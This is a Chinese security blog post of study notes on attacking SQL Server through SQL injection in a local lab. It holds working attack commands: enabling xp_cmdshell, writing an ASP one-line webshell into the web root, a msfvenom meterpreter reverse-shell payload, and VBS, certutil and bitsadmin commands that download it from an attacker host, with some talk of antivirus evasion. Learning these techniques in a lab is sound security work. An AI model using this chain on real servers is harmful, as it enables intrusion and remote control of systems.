# MSSQL：我(蹦蹦跳跳地)来了

阅读量 **219145**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-03 14:30:34

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t010b4443aa199ea60c.jpg)

继上篇文章  
《六问MySQL？你敢来挑战吗？》<https://www.anquanke.com/post/id/235236>  
笔记的重新的整理，MySQL技能又捡回来了不少。说实话，平时学习运用技能，很多情况都是遇到的MySQL（默认端口号3306），所以对SQL
Server（默认端口号1433）比较陌生了。因此便有这一篇的学习笔记，思想均来自互联网，提供学习参考，如有谬误，敬请指正。

## 0x00 千里之行始于足下

搭建环境是后文实验的前题。但是搭建环境不是本文的重点，所以简要记录一下目标环境的搭建以及会遇到的问题：  
（1）待搭建靶场压缩包：  
Larryxi前辈的系统：<https://github.com/Larryxi/MSSQL-SQLi-Labs.git>  
（2）安装ASP和Windows环境  
参考文章：<https://blog.csdn.net/a673216150/article/details/79286130>  
（3）配置config.asp文件，忘记sqlserver的sa用户密码  
参考链接：<https://jingyan.baidu.com/article/b0b63dbf8465580a4930705a.html>  
（4）数据库没有先建立数据库test，导致执行install失败：

![](https://p5.ssl.qhimg.com/t01e773e53862113af2.png)

![](https://p5.ssl.qhimg.com/t0133d5d0407672f28e.png)

如果读者遇到其他安装问题，可自行根据错误信息进行百度或者在下方留言求助。

## 0x01 秤砣虽小能压千斤

###  1、初步判断数据库类型

题外话，之前有小伙伴发出灵魂之问，面对一个网站的注入，怎么判断web后面是什么数据库类型？我当时语塞（面对这个问题，我还真回答不上来），只知道平时感觉差不多是MySQL，随便试试，然后（工具人）再用sqlmap扫一扫。所以针对这个问题，决定补补功课。

**（1）常用的数据库**

MySQL（3306）、SQL server（1433）、Oracle（1521）、PostgreSQL（5432）等等。

**（2）判断方法**

**1）根据前端页面**

①asp: SQL server  
②.net：SQL server  
③php：MySQL、PostgrrSQL  
④java：MySQL、Oracle  
通过上面大致判断。

**2）根据扫描端口**

（我在本地搭建了两个系统）

![](https://p4.ssl.qhimg.com/t01ce0b7ff33b76460c.png)

上述端口号是默认端口号，基于网站管理员没有修改默认端口为其他端口。如果修改了，该方式就可能判断不出来。

**3）根据各数据库特有函数**

(目前我就搭建了MySQL和SQL server)  
比如以下MySQL和SQL server查询版本函数不一样  
MySQL：  
`select version();`  
`select @[@version](https://github.com/version "@version");`  
两条语句都可以执行

SQL server：  
`select version();`  
`select @[@version](https://github.com/version "@version");`  
version()不是内置函数名称

![](https://p1.ssl.qhimg.com/t01dc22ff68a2d85adf.png)

再如MySQL和SQL server的求长度函数  
MySQL：  
`select length(@[@version](https://github.com/version "@version"))`  
`select len(@[@version](https://github.com/version "@version"))`  
len()函数不能被识别

![](https://p1.ssl.qhimg.com/t0153207d06ce70a699.png)

SQL server：  
`select length(@[@version](https://github.com/version "@version"))`  
`select len(@[@version](https://github.com/version "@version"))`  
length()函数不能被识别

![](https://p2.ssl.qhimg.com/t011fe18287101c7929.png)

（下次文章再试试Oracle）

####  4）根据注释符号

MySQL注释符：  
`#`  
`--[] (中括号表示空格，必须要添加空格才能使MySQL注释符生效)`  
`/**/ 多行注释符`

![](https://p2.ssl.qhimg.com/t0152d5bf9e09d74acf.png)

SQL server注释符：  
`-- 有无空格都无所谓`  
`/**/ 多行注释符`

![](https://p3.ssl.qhimg.com/t0182a678889569e7f4.png)

####  5）根据对字符串处理

MySQL：

![](https://p3.ssl.qhimg.com/t01cee880562f2fb15e.png)

![](https://p3.ssl.qhimg.com/t01e315b7bbee732dc6.png)

![](https://p3.ssl.qhimg.com/t017e70b94296ecd60a.png)

SQL server：

![](https://p0.ssl.qhimg.com/t016702c76a5b282c97.png)

![](https://p1.ssl.qhimg.com/t01733dafab779ec992.png)

![](https://p3.ssl.qhimg.com/t016fdd01e2d1ec8282.png)

**6）各个数据库特有表**

![](https://p2.ssl.qhimg.com/t01d70204942a1fc043.png)

MySQL查询不存在的表：

![](https://p1.ssl.qhimg.com/t01c17c0b964fccd2d7.png)

![](https://p5.ssl.qhimg.com/t01f9637f0807a0a9f0.png)

哼！sysobjects（系统自带表）才是我的（SQL server）的菜。

![](https://p4.ssl.qhimg.com/t01a75a3ffbbaae4fdc.gif)

说了这么多  
还是实战直接点

判断SQL server数据库

![](https://p5.ssl.qhimg.com/t017d3d00fb7ff850f3.png)

加“#”注释符依旧表示不正常。看来不是MySQL。试试SQL server的注释符“—”(两个横杠)：

![](https://p1.ssl.qhimg.com/t01276f5c987439d08b.png)

Bingo！SQL server！注释符这个套，你是跑不掉的！  
不服？再战：

![](https://p4.ssl.qhimg.com/t0178efa28461a278f5.png)

这个数据库表，你总不能否认了吧！（傲娇.jpg）  
查看当前数据库，（这个我原来是真的不知道）  
在MySQL中，information_schema数据库中存取了数据库名称  
在SQL server中，只需要指定函数select db_name(N),N=0时就可以获取当前数据库了

![](https://p3.ssl.qhimg.com/t01e24e556afa93d045.png)

![](https://p2.ssl.qhimg.com/t0105304463a5b6e4ee.png)

变换n，就可以遍历得到各个数据库名

![](https://p5.ssl.qhimg.com/t01bf7181d15a55e41a.png)

MySQL和SQL server手工注入还是又很多不一样的  
由于篇幅问题，感兴趣的小伙伴自己实操对比一下  
推荐链接：<https://www.cnblogs.com/yankaohaitaiwei/p/11809398.html>

###  2、sqlmap

`python sqlmap.py -u "http://localhost:88/less-1.asp?id=1" --dbs`  
有哪些数据库

![](https://p5.ssl.qhimg.com/t0138582cc87505e4dd.png)

`--os-shell 该参数主要是调用xp_cmdshell执行系统命令。`  
`--sql-shell 主要用于是执行数据库语句。`

`python sqlmap.py -u "http://localhost:88/less-1.asp?id=1" --os-shell`  
执行系统命令

![](https://p1.ssl.qhimg.com/t013a067c0cc37b6a52.png)

xp_cmdshell开启，就可以执行系统命令  
如果没有开启

![](https://p4.ssl.qhimg.com/t017cc3348234057ec9.png)

![](https://p5.ssl.qhimg.com/t0193899bd5fc563224.png)

在这种情况下，可以测试能否使用—sql-shell进行手动开启xp_cmdshell。  
`--开启xp_cmdshell`  
`exec sp_configure 'show advanced options', 1;`  
`reconfigure;`  
`exec sp_configure 'xp_cmdshell', 1;`  
`reconfigure;`  
`exec sp_configure 'show advanced options', 0;`  
`reconfigure;`

`exec master..xp_cmdshell 'whoami'--能执行得到whoami的结果`

`--关闭xp_cmdshell`  
`exec sp_configure 'show advanced options', 1;`  
`reconfigure;`  
`exec sp_configure 'xp_cmdshell', 0;`  
`reconfigure;`  
`exec sp_configure 'show advanced options', 0;`  
`reconfigure;`

`exec master..xp_cmdshell 'whoami'--不能得到whoami的结果`  
咋回事？开启不了

![](https://p0.ssl.qhimg.com/t01193ac43f75167ba8.png)

（估计是真的开启不了吧？有知道的可以聊一聊）  
如果能获得SQL server外链登陆，（网站配置文件泄露、爆破等），可直接远程登陆开启

![](https://p3.ssl.qhimg.com/t01a2cbcdf4eb1b2ffa.png)

补充一个小技巧，执行以下语句可获得目标网站的指定盘符或路径得文件：  
`exec master.dbo.xp_subdirs 'f:';`

![](https://p1.ssl.qhimg.com/t0157a96923cb8cc87c.png)

## 0x02 百尺竿头更进一步

在上一步，有了xp_cmdshell可以执行任意命令之后，又获得了目标的web目录，我们的目标就是进一步渗透，实现载荷落地、载荷执行。这里其实可以开一篇文章，但是顺手，就直接写在这里：

###  1、直接写入webshell

获取web目录，单刀直入！  
通过上述方法获得web网站（反正我是一个一个找的）：  
`f:\7788\MSSQL-SQLi-Labs`  
然后可以向该目录写入webshell（< 和 > 需要使用 ^ 进行转义）：  
`exec master..xp_cmdshell 'echo ^<%eval request("chopper")%^>
>>f:\\7788\\MSSQL-SQLi-Labs\\shell.asp'`  
执行成功之后会在该目录下生成一个webshell：

![](https://p2.ssl.qhimg.com/t01139cf12f8079bf38.png)

菜刀连接成功：

![](https://p4.ssl.qhimg.com/t01617a26a823d66264.png)

（从数据库写入这个一句话木马并没有引起火绒的的安全提示，应该是安全的。）  
这里不限于使用一句话木马，还可以冰蝎、蚁剑、哥斯拉等免杀木马一句句echo追加  
（注意>>是追加，>是覆盖）  
比如试试原生冰蝎木马：

![](https://p3.ssl.qhimg.com/t0121c02847a4ec5361.png)

![](https://p4.ssl.qhimg.com/t01c77aed587315c83a.png)

###  2、远程下载载荷

关于这方面的内容，网上有很多不错的方法：  
推荐文章：渗透技巧——通过cmd上传文件的N种方法 `https://www.secpulse.com/archives/44450.html`  
其中64位win10系统已经不支持在命令窗口中打开debug程序，所以有些方法可能不适用了。  
我首先在kali的msf生成一个木马文件：  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xx.xxx.xxx LPORT=443 -f
msi -o msi.txt`

![](https://p5.ssl.qhimg.com/t017ace43489cb0973e.png)

（1）certutil.exe远程下载  
怎么说呢？刚下载就露出“马脚”了。

![](https://p5.ssl.qhimg.com/t019882ddcbfe81a289.png)

果不其然，马儿没加装饰，就被kill了

![](https://p2.ssl.qhimg.com/t01edaf62790b18ae00.png)

![](https://p5.ssl.qhimg.com/t017c494f8b2217705a.png)

所以，各位看官们，免杀才是终极之道，值得深究。Tide团队出文了一系列的免杀文章，可以去看看，但是并不是说那些法子就可以免杀，而是要作为基础，发散思维，综合利用。（奈何今年考研，还没有时间精力深究）  
总之，这种方法是可以下载载荷的。  
（2）vbs脚本远程下载  
将以下代码保存为vbs文件：  
`Set Post = CreateObject("Msxml2.XMLHTTP")`  
`Set Shell = CreateObject("Wscript.Shell")`  
`Post.Open "GET","http://xx.xx.xxx.xxx:8888/msi.txt",0`  
`Post.Send()`  
`Set aGet = CreateObject("ADODB.Stream")`  
`aGet.Mode = 3`  
`aGet.Type = 1`  
`aGet.Open()`  
`aGet.Write(Post.responseBody)`  
`aGet.SaveToFile "F:\7788\MSSQL-SQLi-Labs\shell.txt",2`  
用上面同样echo的方法一句一句写入：

![](https://p2.ssl.qhimg.com/t012201a4802d2835b1.png)

![](https://p5.ssl.qhimg.com/t01c91820be43aed03c.png)

想当然，这种方法也早就用烂了。又被double kill！  
（3）powershell远程下载（这个也是最常用的，也是过不了火绒和360的）  
（4）cs脚本远程下载  
该脚本也是和vbs的脚本一样，需要一句一句echo，然后执行该cs脚本，远程下载木马。  
（5）hta脚本远程下载  
和前两种脚本一样，一句一句echo，执行该hta，远程下载木马。（这种似乎平时很少用到，主要是忘记了，不过，过不了WAF）  
（6）bitsadmin  
bitsadmin是一个命令行工具，可用于创建下载上传进程，如下命令：  
`bitsadmin /transfer "test" http://xx.xxxx.xxx:8888/msi.txt F:\7788\MSSQL-SQLi-Labs\shellmsi.txt`

![](https://p0.ssl.qhimg.com/t012b052c0ecd83c124.png)

当然，肯定不止这些方法..方法是这些方法，厉害的是那些怎么绕过！（我太菜了）

![](https://p5.ssl.qhimg.com/t018c2ad1efc9389c01.jpg)

###  3、执行恶意程序

下载的载荷，需要使用加载器，最好的选择就是“土生土长”，“从内部瓦解”：利用系统自带的程序加载器执行相应的载荷。系统自带的加载器常见的有：  
（1）msiexec

![](https://p2.ssl.qhimg.com/t0153411c486a31b2ce.png)

就拿刚刚下载shellmsi.txt文件来杀鸡儆猴：

![](https://p0.ssl.qhimg.com/t018f8912f1ccc212c4.png)

（杀“鸡”失败！）

![](https://p0.ssl.qhimg.com/t01ea5467463917f6fa.png)

（2）csc.exe  
csc.exe是c#的编译器，在前面下载cs脚本之后，就可以使用该编译器远程下载木马。  
（3）powershell.exe  
（4）cscript  
vbs的编译器，前面的vbs的执行组要用到，执行：  
cscript shell.vbs  
即可远程下载。

在整个过程中，下载绕过是难关之一，木马免杀又是一道坎儿……怎么绕过、免杀，一直都是网络安全攻防中的话题。运用好了，你就是大佬（膜拜）；没运用好，就是我这样可爱（愣头愣脑）的工具人。  
当然，上面讲的都是xp_cmdshell可任意执行命令的情况下的文件落地。无文件落地也是更深一步的技术了，也是如今比较流行的。  
这不，有人问我，xp_cmdshell不能开启怎么办？这种情况，那可能就是权限低了？那么找找有不有其他的存储过程可以使用，实在不行，很好呀，新的问题来了，提权？网上有很多奇淫技巧，文章篇幅受限，看官们自己去看看吧！  
哦豁！忘记了，忘记还有日志写入shell！

![](https://p3.ssl.qhimg.com/t0196cc04148af7f5fb.png)

参考链接：  
删除xp_cmdshell和恢复xp_cmdshell：<http://www.splaybow.com/post/delete-xpcmdshell-recover.html>  
SQL注入之判断数据库：<https://www.cnblogs.com/wangtanzhi/p/13052360.html>  
详述MSSQL服务在渗透测试中的利用（上篇） <https://www.cnblogs.com/ichunqiu/p/7249474.html>  
详述MSSQL服务在渗透测试中的利用 （下篇） <https://www.cnblogs.com/ichunqiu/p/7249516.html>  
Exec OS Command Via MSSQL
<https://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.html>  
sqlmap关于MSSQL执行命令研究 <https://mp.weixin.qq.com/s/U1MaRyNJjiX4yxZt1TW4TA>  
MSSQL注入 突破不能堆叠的限制执行系统命令 <https://mp.weixin.qq.com/s/CcgUb7mLlP2xjcrpy5VGbQ>  
MSSQL注入DNS带外问题解决 <https://mp.weixin.qq.com/s/xcX7XnIhFjj-r3OKvHH7DQ>  
MSSQL绕过360提权实战案例 <https://mp.weixin.qq.com/s/Ch342vyszfhUWSlkJEzMOA>  
高级的MSSQL注入技巧 <https://xz.aliyun.com/t/8513>  
MSSQL绕过微软杀毒提权案例 <https://mp.weixin.qq.com/s/GceeUFbwsaHUwKQpY6VFkw>  
MSSQL数据库攻击实战指北 | 防守方攻略 <https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg>  
MSSQL注入 <https://blog.csdn.net/qq_35569814/article/details/100528187>  
数据库集合学习资料 <https://websec.ca/kb/sql_injection>  
【SQL注入】之MSSQL注入 <https://www.cnblogs.com/yankaohaitaiwei/p/11809398.html>  
Windows无文件落地：<http://t3ngyu.leanote.com/post/Windows-noFile>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wholesome** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241805](/post/id/241805)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [数据库](/tag/数据库)
  * [mssql](/tag/mssql)

 **+1** __1赞

 __收藏

![](https://p4.ssl.qhimg.com/t01ba3c32bd89918daf.png) wholesome

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

